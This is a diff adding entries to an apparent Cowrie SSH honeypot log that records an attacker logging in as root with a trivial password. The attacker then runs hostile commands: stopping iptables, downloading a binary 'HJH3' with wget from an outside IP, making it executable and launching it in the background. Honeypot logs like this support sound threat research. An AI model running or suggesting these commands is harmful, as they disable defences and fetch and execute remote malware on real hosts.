@@ -5937,3 +5937,46 @@
 2017-02-24T02:08:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,25221,42.51.28.251] login attempt: 2
 2017-02-24T02:08:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,25221,42.51.28.251] login return, expect: [root/0]
 2017-02-24T02:08:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,25221,42.51.28.251] login attempt [root/0] succeeded
+2017-02-24T02:08:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,25221,42.51.28.251] 'root' authenticated with 'password'
+2017-02-24T02:08:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,25221,42.51.28.251] starting service 'ssh-connection'
+2017-02-24T02:08:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] got channel 'session' request
+2017-02-24T02:08:02+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] channel open
+2017-02-24T02:08:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] pty request: 'vanilla' (24, 80, 0, 0)
+2017-02-24T02:08:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Terminal Size: 24 80
+2017-02-24T02:08:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] getting shell
+2017-02-24T02:08:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Opening TTY Log: log/tty/20170224-020803-f819ad0e-0i.log
+2017-02-24T02:08:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: service iptables stop
+2017-02-24T02:08:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command found: service iptables stop
+2017-02-24T02:08:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: wget http://42.51.32.116:7878/HJH3
+2017-02-24T02:08:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command found: wget http://42.51.32.116:7878/HJH3
+2017-02-24T02:08:07+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://42.51.32.116:7878/HJH3>
+2017-02-24T02:08:11+0000 [HTTPPageDownloader,client] Downloaded URL (http://42.51.32.116:7878/HJH3) with SHA-256 2e42cc767f0064c9a956def9ab8635c6faa26d72b189e4a21c787b51c1598554 to dl/2e42cc767f0064c9a956def9ab8635c6faa26d72b189e4a21c787b51c1598554
+2017-02-24T02:08:11+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://42.51.32.116:7878/HJH3>
+2017-02-24T02:08:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: chmod 0755 /root/HJH3
+2017-02-24T02:08:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command found: chmod 0755 /root/HJH3
+2017-02-24T02:08:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: nohup /root/HJH3 > /dev/null 2>&1 &
+2017-02-24T02:08:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command found: nohup /root/HJH3 > /dev/null 2 >& 1 &
+2017-02-24T02:08:19+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: chmod 777 HJH3
+2017-02-24T02:08:19+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command found: chmod 777 /root/HJH3
+2017-02-24T02:08:23+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: ./HJH3
+2017-02-24T02:08:23+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command not found: ./HJH3
+2017-02-24T02:08:27+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: chmod 0755 /root/HJH3
+2017-02-24T02:08:27+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command found: chmod 0755 /root/HJH3
+2017-02-24T02:08:31+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: nohup /root/HJH3 &gt; /dev/null 2&gt;&amp;1 &amp;
+2017-02-24T02:08:31+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command found: nohup /root/HJH3 & gt
+2017-02-24T02:08:31+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command not found: /dev/null 2 & gt ;& amp
+2017-02-24T02:08:31+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command not found: 1 & amp
+2017-02-24T02:08:35+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: chmod 0777 HJH3
+2017-02-24T02:08:35+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command found: chmod 0777 /root/HJH3
+2017-02-24T02:08:39+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: chmod u+x HJH3
+2017-02-24T02:08:39+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command found: chmod u+x /root/HJH3
+2017-02-24T02:08:43+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: ./HJH3 &
+2017-02-24T02:08:43+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command not found: ./HJH3 &
+2017-02-24T02:08:47+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: chmod u+x HJH3
+2017-02-24T02:08:47+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command found: chmod u+x /root/HJH3
+2017-02-24T02:08:51+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: ./HJH3 &
+2017-02-24T02:08:51+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command not found: ./HJH3 &
+2017-02-24T02:08:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: cd /tmp
+2017-02-24T02:08:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command found: cd /tmp
+2017-02-24T02:08:59+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] CMD: service iptables stop
+2017-02-24T02:08:59+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,25221,42.51.28.251] Command found: service iptables stop
